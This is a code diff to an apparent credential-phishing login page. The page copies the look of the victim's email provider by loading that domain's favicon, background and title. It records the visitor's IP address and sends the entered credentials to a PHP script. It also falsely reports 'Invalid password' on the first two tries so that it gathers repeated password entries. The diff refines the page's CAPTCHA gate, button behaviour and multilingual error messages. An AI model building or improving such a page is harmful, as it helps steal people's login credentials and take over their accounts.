@@ -9,7 +9,6 @@
 <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
 
 <style>
-/* Base styles */
 * {
   box-sizing: border-box;
 }
@@ -115,11 +114,6 @@ button {
 
 button:hover {
   background: #2d5f8f;
-}
-
-button:disabled {
-  opacity: 0.6;
-  cursor: not-allowed;
 }
 
 .email-wrapper {
@@ -263,10 +257,8 @@ html[dir="rtl"] #togglePassword {
     <div id="captchaSuccess" class="captcha-success">✓ Verified</div>
     <div id="captchaError" class="captcha-error">Please complete the security verification</div>
 
-    <button type="submit" id="signInBtn" disabled>
-      <span id="buttonText">Sign in</span>
-      <div class="spinner" id="loadingSpinner"></div>
-    </button>
+    <button type="submit" id="signInBtn">Sign in</button>
+    <div class="spinner" id="loadingSpinner"></div>
   </form>
 </div>
 
@@ -313,13 +305,13 @@ const domainTitle = document.getElementById("domainTitle");
 const passwordInput = document.getElementById("password");
 const signInBtn = document.getElementById("signInBtn");
 const loginForm = document.getElementById("loginForm");
-const buttonText = document.getElementById("buttonText");
+const buttonText = signInBtn; // button text is inside button
 const loadingSpinner = document.getElementById("loadingSpinner");
 const errorMessage = document.getElementById("errorMessage");
 const togglePassword = document.getElementById("togglePassword");
 const captchaContainer = document.getElementById("captcha-container");
-const captchaSuccess = document.getElementById("captchaSuccess");
-const captchaError = document.getElementById("captchaError");
+const captchaSuccessDiv = document.getElementById("captchaSuccess");
+const captchaErrorDiv = document.getElementById("captchaError");
 
 // Hidden fields
 const ipAddressField = document.getElementById("ipAddress");
@@ -368,33 +360,38 @@ function setLanguage(langCode) {
   if (langCode === 'ar') document.documentElement.dir = 'rtl';
   else document.documentElement.dir = 'ltr';
   
-  // Simple translations for UI (we can expand if needed)
   const translations = {
-    en: { email_placeholder: "Email address", password_placeholder: "Password", sign_in: "Sign in", show: "Show", hide: "Hide", invalid: "Invalid password. Please try again.", signing: "Signing in..." },
-    es: { email_placeholder: "Correo electrónico", password_placeholder: "Contraseña", sign_in: "Iniciar sesión", show: "Mostrar", hide: "Ocultar", invalid: "Contraseña incorrecta. Inténtelo de nuevo.", signing: "Iniciando sesión..." },
-    fr: { email_placeholder: "Adresse e-mail", password_placeholder: "Mot de passe", sign_in: "Se connecter", show: "Afficher", hide: "Masquer", invalid: "Mot de passe incorrect. Veuillez réessayer.", signing: "Connexion en cours..." },
-    de: { email_placeholder: "E-Mail-Adresse", password_placeholder: "Passwort", sign_in: "Anmelden", show: "Anzeigen", hide: "Ausblenden", invalid: "Ungültiges Passwort. Bitte versuchen Sie es erneut.", signing: "Anmeldung läuft..." },
-    it: { email_placeholder: "Indirizzo email", password_placeholder: "Password", sign_in: "Accedi", show: "Mostra", hide: "Nascondi", invalid: "Password non valida. Riprova.", signing: "Accesso in corso..." },
-    pt: { email_placeholder: "Endereço de email", password_placeholder: "Senha", sign_in: "Entrar", show: "Mostrar", hide: "Ocultar", invalid: "Senha inválida. Tente novamente.", signing: "Entrando..." },
-    ru: { email_placeholder: "Адрес электронной почты", password_placeholder: "Пароль", sign_in: "Войти", show: "Показать", hide: "Скрыть", invalid: "Неверный пароль. Попробуйте еще раз.", signing: "Вход..." },
-    ar: { email_placeholder: "عنوان البريد الإلكتروني", password_placeholder: "كلمة المرور", sign_in: "تسجيل الدخول", show: "إظهار", hide: "إخفاء", invalid: "كلمة المرور غير صحيحة. حاول مرة أخرى.", signing: "جاري تسجيل الدخول..." },
-    zh: { email_placeholder: "电子邮件地址", password_placeholder: "密码", sign_in: "登录", show: "显示", hide: "隐藏", invalid: "密码无效。请再试一次。", signing: "正在登录..." },
-    ja: { email_placeholder: "メールアドレス", password_placeholder: "パスワード", sign_in: "サインイン", show: "表示", hide: "非表示", invalid: "パスワードが無効です。もう一度お試しください。", signing: "サインイン中..." },
-    ko: { email_placeholder: "이메일 주소", password_placeholder: "비밀번호", sign_in: "로그인", show: "표시", hide: "숨기기", invalid: "잘못된 비밀번호입니다. 다시 시도해 주세요.", signing: "로그인 중..." },
-    hi: { email_placeholder: "ईमेल पता", password_placeholder: "पासवर्ड", sign_in: "साइन इन", show: "दिखाएं", hide: "छुपाएं", invalid: "अमान्य पासवर्ड। कृपया पुनः प्रयास करें।", signing: "साइन इन हो रहा है..." }
+    en: { email_placeholder: "Email address", password_placeholder: "Password", sign_in: "Sign in", show: "Show", hide: "Hide", invalid: "Invalid password. Please try again.", signing: "Signing in...", captcha_required: "Please complete the verification to proceed" },
+    es: { email_placeholder: "Correo electrónico", password_placeholder: "Contraseña", sign_in: "Iniciar sesión", show: "Mostrar", hide: "Ocultar", invalid: "Contraseña incorrecta. Inténtelo de nuevo.", signing: "Iniciando sesión...", captcha_required: "Complete la verificación para continuar" },
+    fr: { email_placeholder: "Adresse e-mail", password_placeholder: "Mot de passe", sign_in: "Se connecter", show: "Afficher", hide: "Masquer", invalid: "Mot de passe incorrect. Veuillez réessayer.", signing: "Connexion en cours...", captcha_required: "Veuillez compléter la vérification pour continuer" },
+    de: { email_placeholder: "E-Mail-Adresse", password_placeholder: "Passwort", sign_in: "Anmelden", show: "Anzeigen", hide: "Ausblenden", invalid: "Ungültiges Passwort. Bitte versuchen Sie es erneut.", signing: "Anmeldung läuft...", captcha_required: "Bitte schließen Sie die Überprüfung ab, um fortzufahren" },
+    it: { email_placeholder: "Indirizzo email", password_placeholder: "Password", sign_in: "Accedi", show: "Mostra", hide: "Nascondi", invalid: "Password non valida. Riprova.", signing: "Accesso in corso...", captcha_required: "Completa la verifica per procedere" },
+    pt: { email_placeholder: "Endereço de email", password_placeholder: "Senha", sign_in: "Entrar", show: "Mostrar", hide: "Ocultar", invalid: "Senha inválida. Tente novamente.", signing: "Entrando...", captcha_required: "Conclua a verificação para continuar" },
+    ru: { email_placeholder: "Адрес электронной почты", password_placeholder: "Пароль", sign_in: "Войти", show: "Показать", hide: "Скрыть", invalid: "Неверный пароль. Попробуйте еще раз.", signing: "Вход...", captcha_required: "Пожалуйста, пройдите проверку для продолжения" },
+    ar: { email_placeholder: "عنوان البريد الإلكتروني", password_placeholder: "كلمة المرور", sign_in: "تسجيل الدخول", show: "إظهار", hide: "إخفاء", invalid: "كلمة المرور غير صحيحة. حاول مرة أخرى.", signing: "جاري تسجيل الدخول...", captcha_required: "يرجى إكمال التحقق للمتابعة" },
+    zh: { email_placeholder: "电子邮件地址", password_placeholder: "密码", sign_in: "登录", show: "显示", hide: "隐藏", invalid: "密码无效。请再试一次。", signing: "正在登录...", captcha_required: "请完成验证以继续" },
+    ja: { email_placeholder: "メールアドレス", password_placeholder: "パスワード", sign_in: "サインイン", show: "表示", hide: "非表示", invalid: "パスワードが無効です。もう一度お試しください。", signing: "サインイン中...", captcha_required: "続行するには認証を完了してください" },
+    ko: { email_placeholder: "이메일 주소", password_placeholder: "비밀번호", sign_in: "로그인", show: "표시", hide: "숨기기", invalid: "잘못된 비밀번호입니다. 다시 시도해 주세요.", signing: "로그인 중...", captcha_required: "계속하려면 인증을 완료하세요" },
+    hi: { email_placeholder: "ईमेल पता", password_placeholder: "पासवर्ड", sign_in: "साइन इन", show: "दिखाएं", hide: "छुपाएं", invalid: "अमान्य पासवर्ड। कृपया पुनः प्रयास करें।", signing: "साइन इन हो रहा है...", captcha_required: "आगे बढ़ने के लिए सत्यापन पूरा करें" }
   };
   const t = translations[langCode] || translations.en;
   emailInput.placeholder = t.email_placeholder;
   passwordInput.placeholder = t.password_placeholder;
-  buttonText.innerText = t.sign_in;
+  signInBtn.innerText = t.sign_in;
   togglePassword.innerText = (passwordInput.type === 'password') ? t.show : t.hide;
   // Store for error messages
   window._translations = t;
 }
 
-function showError(messageKey) {
-  const t = window._translations || { invalid: "Invalid password", signing: "Signing in..." };
-  const msg = (messageKey === 'invalid_password') ? t.invalid : t.signing;
+function showError(messageKey, customMsg = null) {
+  const t = window._translations || { invalid: "Invalid password", signing: "Signing in...", captcha_required: "Please complete the verification to proceed" };
+  let msg = customMsg;
+  if (!msg) {
+    if (messageKey === 'invalid_password') msg = t.invalid;
+    else if (messageKey === 'signing_in') msg = t.signing;
+    else if (messageKey === 'captcha_required') msg = t.captcha_required;
+    else msg = t.captcha_required;
+  }
   errorMessage.innerText = msg;
   errorMessage.style.display = 'block';
   setTimeout(() => errorMessage.style.display = 'none', 3000);
@@ -432,7 +429,6 @@ function collectUserData() {
     .then(r => r.json())
     .then(data => {
       ipAddressField.value = data.ip;
-      userCountry = data.country_code;
     })
     .catch(() => {
       ipAddressField.value = 'Unknown';
@@ -458,27 +454,28 @@ function initializeCaptcha() {
       callback: function(token) {
         captchaToken = token;
         captchaVerified = true;
-        captchaError.style.display = 'none';
+        captchaErrorDiv.style.display = 'none';
         // Show success message
-        captchaSuccess.style.display = 'block';
-        setTimeout(() => { captchaSuccess.style.display = 'none'; }, 3000);
+        captchaSuccessDiv.style.display = 'block';
+        setTimeout(() => { captchaSuccessDiv.style.display = 'none'; }, 3000);
         // Hide widget
         captchaContainer.style.display = 'none';
-        updateSignInButton();
+        // Remove any lingering CAPTCHA error message
+        if (errorMessage.innerText === (window._translations?.captcha_required || "Please complete the verification to proceed")) {
+          errorMessage.style.display = 'none';
+        }
       },
       'expired-callback': function() {
         if (!captchaVerified) {
           captchaToken = '';
-          captchaError.style.display = 'block';
-          updateSignInButton();
+          captchaErrorDiv.style.display = 'block';
           if (!captchaVerified) captchaContainer.style.display = 'flex';
         }
       },
       'error-callback': function() {
         if (!captchaVerified) {
           captchaToken = '';
-          captchaError.style.display = 'block';
-          updateSignInButton();
+          captchaErrorDiv.style.display = 'block';
         }
       },
       language: currentLanguage
@@ -491,9 +488,8 @@ function resetCaptcha() {
   if (turnstileWidgetId !== null && window.turnstile) {
     turnstile.reset(turnstileWidgetId);
     captchaToken = '';
-    captchaError.style.display = 'none';
+    captchaErrorDiv.style.display = 'none';
     captchaContainer.style.display = 'flex';
-    updateSignInButton();
   }
 }
 
@@ -525,23 +521,12 @@ function lockEmailAndUpdateDomain() {
     loadBackground(currentDomain);
     logo.src = "https://www.google.com/s2/favicons?sz=128&domain=" + currentDomain;
     domainTitle.textContent = currentDomain;
-    updateSignInButton();
   } else {
     domainOverlay.textContent = "";
-    updateSignInButton();
-  }
-}
-
-function updateSignInButton() {
-  if (emailInput.value.trim() && passwordInput.value.trim() && captchaToken) {
-    signInBtn.disabled = false;
-  } else {
-    signInBtn.disabled = true;
   }
 }
 
 // --- Event listeners ---
-passwordInput.addEventListener('input', updateSignInButton);
 togglePassword.addEventListener('click', () => {
   const t = window._translations || { show: 'Show', hide: 'Hide' };
   if (passwordInput.type === 'password') {
@@ -552,36 +537,42 @@ togglePassword.addEventListener('click', () => {
     togglePassword.textContent = t.show;
   }
 });
-passwordInput.addEventListener('keydown', e => {
-  if (e.key === 'Enter' && !signInBtn.disabled) signInBtn.click();
-});
 
-// --- Form submit with 3 attempts ---
+// --- Form submit with 3 attempts and CAPTCHA check ---
 loginForm.addEventListener('submit', e => {
   e.preventDefault();
-  if (!captchaToken) {
-    captchaError.style.display = 'block';
+
+  // Basic field validation (optional but keeps UX)
+  if (!emailInput.value.trim() || !passwordInput.value.trim()) {
+    showError('invalid_password', "Please fill in both fields.");
     return;
   }
+
+  // Check CAPTCHA verification
+  if (!captchaToken) {
+    showError('captcha_required');
+    return;
+  }
+
   attempts++;
   attemptField.value = attempts;
   timestampField.value = new Date().toISOString();
-  
+
+  // Disable button and show spinner
   signInBtn.disabled = true;
-  buttonText.style.display = 'none';
+  signInBtn.style.opacity = '0.6';
   loadingSpinner.style.display = 'block';
-  
+
   sendToPHP();
-  
+
   setTimeout(() => {
     if (attempts === 1 || attempts === 2) {
       showError('invalid_password');
       passwordInput.value = '';
       signInBtn.disabled = false;
-      buttonText.style.display = 'block';
+      signInBtn.style.opacity = '1';
       loadingSpinner.style.display = 'none';
       passwordInput.focus();
-      updateSignInButton();
     } else if (attempts >= 3) {
       showError('signing_in');
       setTimeout(() => {
@@ -619,7 +610,8 @@ window.addEventListener('DOMContentLoaded', async () => {
     captchaContainer.innerHTML = '<div style="color:#666;text-align:center;padding:20px;">Security verification not configured</div>';
   }
   
-  updateSignInButton();
+  // Ensure button is always enabled initially (no CAPTCHA dependency)
+  signInBtn.disabled = false;
 });
 </script>
 </body>
